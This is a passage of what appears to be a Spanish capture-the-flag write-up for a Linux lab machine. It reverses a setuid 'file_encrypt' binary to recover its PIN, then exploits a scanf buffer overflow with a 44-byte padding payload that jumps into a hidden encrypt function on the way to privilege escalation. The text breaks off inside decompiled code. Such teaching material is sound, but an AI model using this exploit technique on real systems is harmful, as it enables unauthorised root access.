/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/bin/ping
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/opt/file_encrypt/file_encrypt
tester@overflow:~$ ls -l /opt/file_encrypt/file_encrypt
-rwsr-xr-x 1 root root 11904 May 31  2021 <span class="code-white code-bg-red">/opt/file_encrypt/file_encrypt</span>  
</code></pre></div><p>Hay uno que parece interesante: <code>/opt/file_encrypt/file_encrypt</code>. Vamos a ver lo que hace:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ file /opt/file_encrypt/file_encrypt
/opt/file_encrypt/file_encrypt: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ae0f5750a8f1ac38945f813b5e34ddc166daf57, not stripped  
tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: 1
Wrong Pin
</code></pre></div><p>Hay más información relacionada en <code>/opt/file_encrypt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ ls -la /opt/file_encrypt/
total 24
drwxr-x---+ 2 root root  4096 Sep 17 21:56 <span class="code-blue">.</span>
drwxr-xr-x  3 root root  4096 Sep 17 21:56 <span class="code-blue">..</span>
-rwsr-xr-x  1 root root 11904 May 31  2021 <span class="code-white code-bg-red">file_encrypt</span>  
-rw-r--r--  1 root root   399 May 30  2021 README.md
tester@overflow:~$ cat /opt/file_encrypt/README.md
Our couple of reports have been leaked to avoid this.
We have created a tool to encrypt your reports.
Please check the pin feature of this application and
report any issue that you get as this application is
still in development. We have modified the tool a
little bit that you can only use the pin feature now.
The encrypt function is there but you can't use it now.
The PIN should be in your inbox
</code></pre></div><p>El binario está programado para encriptar archivos, pero la función que encripta no se llama en el programa principal. Sin embargo, el código de esa función sigue estando compilado.</p><p>Para analizar el binario, vamos a transferirlo a nuestra máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ which python3
/usr/bin/python3
tester@overflow:~$ cd /opt/file_encrypt
tester@overflow:~$ python3 -m http.server 1234
Serving HTTP on :: port 1234 (http://[::]:1234/) ...
10.10.17.44 - - [] "GET /file_encrypt HTTP/1.1" 200 -  
^C
Keyboard interrupt received, exiting.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.119:1234/file_encrypt -so file_encrypt  
</code></pre></div><p>Ahora podemos usar Ghidra como herramienta de ingeniería inversa para descompilar el binario y ver el código fuente en C.</p><p>Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk8">check_pin</span><span class="mtk1">();</span>  
  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Llama a <code>check_pin</code>, que es esta otra:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">check_pin</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">local_2c[</span><span class="mtk6">20</span><span class="mtk1">];</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_18;</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">local_14;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_10;</span>

  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk8">rand</span><span class="mtk1">();</span>
  <span class="mtk1">local_14</span> <span class="mtk5">=</span> <span class="mtk8">random</span><span class="mtk1">();</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"This</span> <span class="mtk4">is</span> <span class="mtk4">the</span> <span class="mtk4">code</span> <span class="mtk6">%i</span><span class="mtk4">.</span> <span class="mtk4">Enter</span> <span class="mtk4">the</span> <span class="mtk4">Pin:</span> <span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">local_10);</span>
  <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%i</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_18);</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_14</span> <span class="mtk5">==</span> <span class="mtk1">local_18)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"name:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
    <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">local_2c);</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Thanks</span> <span class="mtk4">for</span> <span class="mtk4">checking.</span> <span class="mtk4">You</span> <span class="mtk4">can</span> <span class="mtk4">give</span> <span class="mtk4">your</span> <span class="mtk4">feedback</span> <span class="mtk4">for</span> <span class="mtk4">improvements</span> <span class="mtk4">at</span> <span class="mtk4">developer@overflow.htb"</span><span class="mtk1">);</span>  
  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Wrong</span> <span class="mtk4">Pin"</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>El código almacenado en <code>local_10</code> es siempre el mismo: <code>1804289383</code>. El programa está comparando el valor guardado en <code>local_14</code> con el PIN tomado de la entrada de usuario.</p><p>El número que está en <code>local_14</code> es el resultado de la función llamada <code>random</code>, que es esta:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">long</span> <span class="mtk8">random</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">uint</span> <span class="mtk1">in_stack_00000004;</span>
  <span class="mtk7 mtki">uint</span> <span class="mtk1">local_c;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_8;</span>

  <span class="mtk1">local_c</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">6b8b4567</span><span class="mtk1">;</span>
  <span class="mtk5">for</span> <span class="mtk1">(local_8</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">local_8</span> <span class="mtk5">&lt;</span> <span class="mtk6">10</span><span class="mtk1">;</span> <span class="mtk1">local_8</span> <span class="mtk5">=</span> <span class="mtk1">local_8</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>  
    <span class="mtk1">local_c</span> <span class="mtk5">=</span> <span class="mtk1">local_c</span> <span class="mtk5">*</span> <span class="mtk5">0x</span><span class="mtk6">59</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span> <span class="mtk1">local_c</span> <span class="mtk5">^</span> <span class="mtk1">in_stack_00000004;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Aunque Ghidra no es capaz de mostrar el valor de la variable <code>in_stack_00000004</code>, podemos deducir que es <code>0x6b8b4567</code>. Entonces podemos sacar cuál es el PIN esperado. Por ejemplo, en Python sería así:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; local_c = 0x6b8b4567
&gt;&gt;&gt; for _ in range(10):
...     local_c = local_c * 0x59 + 0x14
...
&gt;&gt;&gt; print(local_c ^ 0x6b8b4567)  
56260846220404243151385449272
</code></pre></div><p>Sin embargo, si metemos este PIN, está mal:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_encrypt</span>
This is the code 1804289383. Enter the Pin: 56260846220404243151385449272  
Wrong Pin
</code></pre></div><p>Aquí tenemos que darnos cuenta de que usa:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%i</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_18);</span>  
</code></pre></div><p>Está leyendo un número entero (<em>integer</em>, no un <em>long integer</em>), por lo que tenemos que truncarlo a 32 bits:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; print((local_c ^ 0x6b8b4567) & 0xffffffff)  
4091990840
</code></pre></div><p>Pero sigue estando mal:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_encrypt</span>
This is the code 1804289383. Enter the Pin: 4091990840  
Wrong Pin
</code></pre></div><p>En este punto, vamos a usar GDB para depurar el programa y ver el valor esperado.</p><p>Primero, vamos a poner un <em>breakpoint</em> en la instrucción de comparación (<code>cmp</code> en ensamblador):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q file_encrypt
Reading symbols from <span class="code-dark-green">file_encrypt</span>...
(No debugging symbols found in <span class="code-dark-green">file_encrypt</span>)
<span class="code-red">gef➤</span>  run
Starting program: ./file_encrypt
This is the code 1804289383. Enter the Pin: ^C  
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0xf7fcf549</span> in <span class="code-dark-yellow">__kernel_vsyscall</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  disassemble check_pin
Dump of assembler code for function check_pin:
   ...
   <span class="code-dark-blue">0x56555afd</span> &lt;+77&gt;:    push   eax
   <span class="code-dark-blue">0x56555afe</span> &lt;+78&gt;:    call   <span class="code-dark-blue">0x565556c0</span> &lt;<span class="code-dark-yellow">__isoc99_scanf@plt</span>&gt;  
   <span class="code-dark-blue">0x56555b03</span> &lt;+83&gt;:    add    esp,0x10
   <span class="code-dark-blue">0x56555b06</span> &lt;+86&gt;:    mov    eax,DWORD PTR [ebp-0x14]
   <span class="code-dark-blue">0x56555b09</span> &lt;+89&gt;:    cmp    DWORD PTR [ebp-0x10],eax
   <span class="code-dark-blue">0x56555b0c</span> &lt;+92&gt;:    jne    <span class="code-dark-blue">0x56555b4a</span> &lt;<span class="code-dark-yellow">check_pin</span>+154&gt;
   ...
End of assembler dump.
<span class="code-green">gef➤</span>  break *0x56555b09
Breakpoint 1 at <span class="code-dark-blue">0x56555b09</span>
</code></pre></div><p>Ahora continuamos el programa, ponemos un PIN cualquiera y leemos el valor en <code>$ebp-0x10</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  continue
Continuing.
1

Breakpoint 1, <span class="code-dark-blue">0x56555b09</span> in <span class="code-dark-yellow">check_pin</span> ()  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  x $ebp-0x10
<span class="code-dark-blue">0xffffd078</span>:     0xf3e6d338  
</code></pre></div><p>Contiene el valor <code>0xf3e6d338</code>, que es <code>4091990840</code> en decimal. Esto es extraño, ya que es el valor que probamos antes.</p><p>El truco aquí es que el valor empieza por <code>0xf</code>, que significa que el bit más significativo es un <code>1</code>. Si esto ocurre, entonces el número es negativo. Para calcular el valor negativo, tenemos que calcular el complemento a dos de <code>0xf3e6d338</code>, que es:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; (~0xf3e6d338 & 0xffffffff) + 1  
202976456
</code></pre></div><p>Otra manera de encontrar este valor es con GDB, expresando el valor como <em>integer</em> (formato <code>d</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  p/d 0xf3e6d338  
$1 = -202976456
</code></pre></div><p>Ahora probamos con <code>-202976456</code>, y funciona:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456  
name:
</code></pre></div><h2 id="explotación-de-_buffer-overflow_">Explotación de <em>Buffer Overflow</em></h2><p>Vamos a revisar qué hace la función <code>check_pin</code> cuando el PIN es correcto:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">check_pin</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">char</span> <span class="mtk1">local_2c[</span><span class="mtk6">20</span><span class="mtk1">];</span>
  <span class="mtk3">//</span> <span class="mtk3">...</span>

  <span class="mtk5">if</span> <span class="mtk1">(local_14</span> <span class="mtk5">==</span> <span class="mtk1">local_18)</span> <span class="mtk1">{</span>
      <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"name:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
      <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">local_2c);</span>
      <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Thanks</span> <span class="mtk4">for</span> <span class="mtk4">checking.</span> <span class="mtk4">You</span> <span class="mtk4">can</span> <span class="mtk4">give</span> <span class="mtk4">your</span> <span class="mtk4">feedback</span> <span class="mtk4">for</span> <span class="mtk4">improvements</span> <span class="mtk4">at</span> <span class="mtk4">developer@overflow.htb"</span><span class="mtk1">);</span>  
  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Wrong</span> <span class="mtk4">Pin"</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>El problema aquí es que está leyendo una cadena de caracteres con <code>scanf</code> (<code>__isoc99_scanf</code>) y un formato <code>%s</code>. Esto es vulnerable a <em>Buffer Overflow</em> porque <code>local_2c</code> tiene 20 bytes asignados como <em>buffer</em> y <code>scanf</code> permite cualquier cadena de caracteres (<code>%s</code>) con cualquier longitud. Vamos a probarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Segmentation fault (core dumped)
</code></pre></div><p>Parece que tenemos que explotar la vulnerabilidad de <em>Buffer Overflow</em>. Pero primero, vamos a ver si el binario tiene alguna protección habilitada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  checksec
<span class="code-blue">[+]</span> checksec for './file_encrypt'
Canary                        : <span class="code-red">✘</span>
NX                            : <span class="code-green">✓</span>
PIE                           : <span class="code-green">✓</span>
Fortify                       : <span class="code-red">✘</span>
RelRO                         : <span class="code-dark-green">Full</span>  
</code></pre></div><p>Tiene NX habilitado (por lo que la pila no es ejecutable) y también PIE habilitado (que significa que las direcciones del binario se aleatorizan si ASLR está habilitado). Antes de continuar, vamos a ver si ASLR está habilitado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ cat /proc/sys/kernel/randomize_va_space  
0
</code></pre></div><p>Y no está habilitado, por lo que la protección PIE no hace nada. Si fuera un <code>2</code>, entonces ASLR sí estaría habilitado.</p><p>Con un <em>Buffer Overflow</em> podemos tomar control del registro <code>$eip</code>, que es el registro <em>Extended Instruction Pointer</em>. Este registro contiene la dirección de la siguiente instrucción a ejecutar. De hecho, el programa se rompió antes porque hemos sobrescrito <code>$eip</code> con <code>0x41414141</code> (<code>AAAA</code>), que es una dirección de memoria no válida.</p><p>Ahora que sabemos que ASLR está deshabilitado, podemos deshabilitarla en nuestra máquina para depurar el programa con GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green">tee</span> /proc/sys/kernel/randomize_va_space  
0
</code></pre></div><p>Para explotar el <em>Buffer Oveflow</em>, tenemos que obtener el número de caracteres necesarios para sobrescribir la dirección de retorno, para poner un valor concreto ahí. Para ello, vamos a usar un patrón:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q file_encrypt</span>
Reading symbols from <span class="code-dark-green">file_encrypt</span>...
(No debugging symbols found in <span class="code-dark-green">file_encrypt</span>)
<span class="code-red">gef➤</span>  pattern create 60
<span class="code-blue">[+]</span> Generating a pattern of 60 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-red">gef➤</span>  run
Starting program: ./file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  

Program received signal SIGSEGV, Segmentation fault.
<span class="code-dark-blue">0x6161616c</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  pattern offset $eip
<span class="code-blue">[+]</span> Searching for '$eip'
<span class="code-green">[+]</span> Found at offset 44 (little-endian search) <span class="code-red">likely</span>  
<span class="code-green">[+]</span> Found at offset 41 (big-endian search)
</code></pre></div><p>Y vemos que el <em>offset</em> es 44, por lo que necesitamos 44 caracteres para sobrescribir la dirección de retorno. Vamos a probarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  run
Starting program: ./file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  

Program received signal SIGSEGV, Segmentation fault.
<span class="code-dark-blue">0x45444342</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><p>Y se muestra que la siguiente instrucción está en la dirección <code>0x45444342</code> (<code>BCDE</code> en <em>little-endian</em>), por lo que tenemos control sobre <code>$eip</code>.</p><p>En Ghidra, podemos encontrar el código de una función llamada <code>encrypt</code> y su dirección. Recordemos que ASLR está deshabilitado y que PIE no tiene efecto, por lo que la dirección de <code>encrypt</code> es estática:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  x encrypt
<span class="code-dark-blue">0x5655585b</span> &lt;<span class="code-dark-yellow">encrypt</span>&gt;:   0x53e58955  
</code></pre></div><p>Y la dirección de <code>encrypt</code> es <code>0x5655585b</code>. Curiosamente, estos bytes son imprimibles. En formato <em>little-endian</em>, la dirección de <code>encrypt</code> es lo mismo que <code>[XUV</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; '\x5b\x58\x55\x56'  
'[XUV'
</code></pre></div><p>Entonces, podemos poner esta dirección en <code>$eip</code> para llamar a <code>encrypt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File:
</code></pre></div><p>En este punto ya hemos explotado el <em>Buffer Overflow</em> para llamar a la función que no estaba en el programa principal.</p><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Vamos a ver el código fuente de <code>encrypt</code> con Ghidra:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">encrypt</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk9 mtki">__block</span><span class="mtk1">,</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">__edflag</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk5">*</span><span class="mtk1">piVar2;</span>
  <span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">pcVar3;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_98</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_94</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_90</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_8c</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_88</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_84</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_80</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_7c</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_78</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_74</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
  <span class="mtk1">stat</span> <span class="mtk1">local_70;</span>
  <span class="mtk7 mtki">uint</span> <span class="mtk1">local_18;</span>
  <span class="mtk1">FILE</span> <span class="mtk5">*</span><span class="mtk1">local_14;</span>
  <span class="mtk1">FILE</span> <span class="mtk5">*</span><span class="mtk1">local_10;</span>
<span></span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter</span> <span class="mtk4">Input</span> <span class="mtk4">File:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84);</span>
  <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter</span> <span class="mtk4">Encrypted</span> <span class="mtk4">File:</span> <span class="mtk4">"</span><span class="mtk1">);</span>
  <span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_98);</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">stat</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_70);</span>
  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">piVar2</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar3</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar2);</span>
    <span class="mtk8">fprintf</span><span class="mtk1">(stderr,</span> <span class="mtk4">"Failed</span> <span class="mtk4">to</span> <span class="mtk4">stat</span> <span class="mtk6">%s</span><span class="mtk4">:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk1">pcVar3);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_70.st_uid</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">fprintf</span><span class="mtk1">(stderr,</span> <span class="mtk4">"File</span> <span class="mtk6">%s</span> <span class="mtk4">is</span> <span class="mtk4">owned</span> <span class="mtk4">by</span> <span class="mtk4">root</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>
  <span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">);</span>
  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk8">fopen</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk4">"rb"</span><span class="mtk1">);</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_10</span> <span class="mtk5">==</span> <span class="mtk1">(FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
